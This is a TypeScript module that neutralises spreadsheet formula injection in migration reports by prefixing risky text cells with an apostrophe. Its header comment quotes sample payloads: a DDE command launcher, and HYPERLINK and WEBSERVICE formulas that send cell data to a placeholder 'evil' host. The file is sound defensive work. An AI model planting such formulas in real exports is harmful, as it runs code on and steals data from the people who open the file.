/**
 * formulaGuard.ts — F3-DATA-MIG-TODAY-001, spreadsheet formula-injection defence
 * for the migration SUCCESS / FAILURE reports.
 *
 * WHY THIS EXISTS
 * ---------------
 * The migration reports are generated FROM CUSTOMER-DERIVED DATA (a vendor
 * source id, an error message templated around a source field name, a warning
 * code list, the source sheet name). They are then handed to a human — a clinic
 * operator or a Platform Admin — who opens them in Excel, LibreOffice Calc or
 * Google Sheets.
 *
 * A spreadsheet does not treat a cell as inert text. A TEXT cell whose value
 * begins with `=`, `+`, `-` or `@` is parsed as a FORMULA when the file is
 * opened. That is not a rendering quirk, it is code execution on the reader's
 * machine:
 *
 *   =cmd|'/c calc'!A1                     -> DDE, launches a local process
 *   =HYPERLINK("http://evil?x="&A1,"ok")  -> exfiltrates neighbouring cells
 *   =WEBSERVICE("http://evil/"&A1)        -> silent outbound request
 *
 * So a report built out of legacy-system data is an EXECUTION VECTOR unless
 * every string cell is neutralised first. Note who the victim is: not our
 * server, not the tenant whose data it is — THE PERSON WHO OPENS THE REPORT.
 * This module is a defence written on that person's behalf, which is exactly
 * why it must be unconditional rather than "applied to the fields that look
 * risky". A field that looks safe today is one schema change away from
 * carrying whatever the vendor put in it.
 *
 * The neutralisation is a single leading apostrophe. Every mainstream
 * spreadsheet reads a leading apostrophe as "the rest of this cell is literal
 * text", renders it without the apostrophe, and never evaluates it.
 *
 * WHAT IS DELIBERATELY *NOT* ESCAPED
 * ----------------------------------
 * Numbers, booleans, Dates, null and undefined pass through untouched. A
 * numeric cell cannot execute — it has no formula grammar — and stringifying it
 * to "defuse" it would corrupt the report instead of protecting it (a real
 * negative count `-3` must stay the number -3, not become the text "'-3").
 * This mirrors the existing report-export builder's typing contract
 * (services/reportExport/formulaSafety.ts): neutralisation is a TEXT-cell
 * concern only.
 *
 * RELATIONSHIP TO services/reportExport/formulaSafety.ts
 * -----------------------------------------------------
 * That module is the same defence for the clinic-facing report exports, but it
 * takes an already-`String()`-ed value and only inspects character 0. The
 * migration reports need a stricter guard, because the values come from an
 * uncontrolled legacy workbook rather than from our own typed columns:
 *   - leading whitespace (including TAB, CR, LF, NBSP and zero-width marks) is
 *     stripped before the trigger character is looked for, since several import
 *     paths skip that whitespace and then evaluate what follows;
 *   - a string that BEGINS with a raw control character (TAB / CR / LF) is
 *     escaped outright, because those same import paths treat a leading control
 *     char as the start of a formula context;
 *   - non-string values are accepted and returned unchanged, so a single call
 *     site can route EVERY cell through this guard without first having to
 *     decide what type it is holding.
 * The two are kept separate on purpose: this one may be tightened for the
 * migration subsystem without re-validating every existing clinic report.
 */

/**
 * The characters a spreadsheet reads as "a formula starts here".
 *
 * Exported so a test can enumerate them rather than restate them — a test that
 * hard-codes its own copy of this list stops testing the guard the moment the
 * guard is extended.
 */
export const FORMULA_TRIGGER_CHARS: readonly string[] = ['=', '+', '-', '@'];

/**
 * Characters skipped before looking for a trigger character.
 *
 * Beyond ordinary space: TAB / CR / LF / VT / FF, plus NBSP (U+00A0) and the
 * zero-width marks BOM (U+FEFF) and ZWSP (U+200B). The last three matter
 * because they are invisible: ` =cmd|...` looks like a harmless value in
 * every UI that displays it, and `String.prototype.trim()` does remove U+00A0
 * and U+FEFF but NOT U+200B — so we do not lean on `trim()` here.
 */
const LEADING_SKIP_CHARS: ReadonlySet<string> = new Set([
  ' ',
  '\t',
  '\r',
  '\n',
  '\v',
  '\f',
  '\u00A0', // NBSP
  '\uFEFF', // BOM / zero-width no-break space
  '\u200B', // zero-width space
]);

/**
 * Raw control characters that make a string suspicious by themselves, without
 * any trigger character following them.
 */
const LEADING_CONTROL_CHARS: ReadonlySet<string> = new Set(['\t', '\r', '\n']);

/** The neutralising prefix. */
const ESCAPE_PREFIX = "'";

/**
 * True when `value` is a string a spreadsheet could evaluate as a formula.
 *
 * A value that already carries the leading apostrophe is NOT triggering — it is
 * already neutralised. That is what makes `escapeSpreadsheetValue` idempotent.
 *
 * Accepts `unknown` so callers never have to narrow before asking: anything
 * that is not a string is, by construction, not formula-triggering.
 */
export function isFormulaTriggering(value: unknown): boolean {
  if (typeof value !== 'string' || value.length === 0) return false;

  // Already neutralised — re-escaping would double the prefix and corrupt the
  // rendered value.
  if (value[0] === ESCAPE_PREFIX) return false;

  // A leading raw control character is escaped on its own merit.
  if (LEADING_CONTROL_CHARS.has(value[0])) return true;

  let i = 0;
  while (i < value.length && LEADING_SKIP_CHARS.has(value[i])) i += 1;
  if (i >= value.length) return false;

  return FORMULA_TRIGGER_CHARS.includes(value[i]);
}

/**
 * Neutralise a single cell value.
 *
 * Strings that could be evaluated come back with a leading apostrophe.
 * EVERYTHING ELSE — number, boolean, Date, null, undefined, object — comes back
 * byte-identical, so this is safe to apply blanket-fashion to a whole row
 * without inspecting types first (see `escapeRow`).
 *
 * Idempotent: `escapeSpreadsheetValue(escapeSpreadsheetValue(x))` always equals
 * `escapeSpreadsheetValue(x)`.
 */
export function escapeSpreadsheetValue<T>(value: T): T | string {
  if (!isFormulaTriggering(value)) return value;
  return `${ESCAPE_PREFIX}${value as unknown as string}`;
}

/**
 * Neutralise a whole row.
 *
 * This is the shape the report writers use, and it is the reason a new column
 * cannot bypass the guard: the writers never hand ExcelJS an array they built
 * themselves, they hand it the return value of this function. Adding a column
 * means adding an element to the array that is passed THROUGH here, so the new
 * column is escaped by construction rather than by the author remembering to.
 */
export function escapeRow(values: unknown[]): unknown[] {
  return values.map((value) => escapeSpreadsheetValue(value));
}
